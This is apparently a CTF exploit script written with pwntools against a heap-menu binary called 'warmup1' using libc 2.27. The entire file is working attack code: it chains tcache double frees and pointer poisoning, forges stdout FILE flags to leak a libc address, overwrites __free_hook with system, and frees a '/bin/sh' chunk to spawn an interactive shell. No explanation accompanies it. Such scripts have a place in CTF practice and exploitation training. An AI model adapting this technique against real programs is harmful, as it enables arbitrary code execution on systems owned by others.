from pwn import *
# p = process("./warmup")
# context.log_level = 'debug'
libc = ELF("./libc-2.27.so")


def add(cont):
    p.recvuntil(">>")
    p.sendline("1")
    p.recvuntil(">>")
    p.send(cont)


def delete(idx):
    p.recvuntil(">>")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))


def modify(idx, cont):
    p.recvuntil(">>")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))
    p.recvuntil(">>")
    p.send(cont)


p = process("./warmup1")
add(p64(0)*7+p64(0x51))
add('1')
add('2')
add('3')
add('4')
add('/bin/sh')
delete(2)
delete(1)
delete(1)
add('\xb0')
add('1')
add(p64(0)+p64(0xa1))  # 1
for i in range(8):
    delete(1)
modify(6, p64(0)+p64(0xa1)+"\x70\x07\xdd")
add("\x50\x07\xdd")  # <- 2
delete(3)
delete(3)
delete(0)
delete(0)
add('\xc0')
# context.log_level = 'debug'
add('1')
add('2')
context.log_level = 'debug'
add(p64(0)*2+p64(0xfbad3c80)+p64(0)*3+p8(0))
p.recv(8)
libc_base = u64(p.recv(6)+"\x00\x00")-0x3ed8b0
success(hex(libc_base))
delete(0)
modify(3, p64(libc_base+libc.symbols["__free_hook"]))
add("1")
add(p64(libc_base+libc.symbols["system"]))
# context.log_level='debug'
delete(5)
p.interactive()
